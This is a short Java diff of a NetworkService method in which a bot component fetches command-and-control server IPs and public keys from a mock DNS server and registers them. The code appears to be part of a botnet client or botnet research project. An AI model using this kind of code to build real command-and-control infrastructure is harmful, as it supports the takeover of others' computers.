@@ -186,13 +186,19 @@ public class NetworkService {
 	public boolean firstConnectToMockServerDns() {
 
 		String url = engineBot.getDnsip() + ":" + engineBot.getDnsport() + engineBot.getUrirequest();
-		Pairs<IP, PublicKey> result = new Pairs<IP, PublicKey>();
+		Pairs<IP, String> result = new Pairs<IP, String>();
+		Pairs<IP,PublicKey> cec=new Pairs<IP,PublicKey>();
 		Integer counter = 0;
 
 		while (counter <= AsyncRequest.REQNUMBER) {
 			try {
 				result = asyncRequest.getIpCeCFromDnsServer(url);
-				commandConquerIps.addCeC(result);
+				
+				cec.setValue1(result.getValue1());
+				
+				cec.setValue2(pki.rebuildPuK(result.getValue2()));
+				
+				commandConquerIps.addCeC(cec);
 				commandConquerIps.getCeCList().forEach(ip -> System.out.println(ip.getValue1()));
 				return Boolean.TRUE;
 			} catch (Exception ex) {
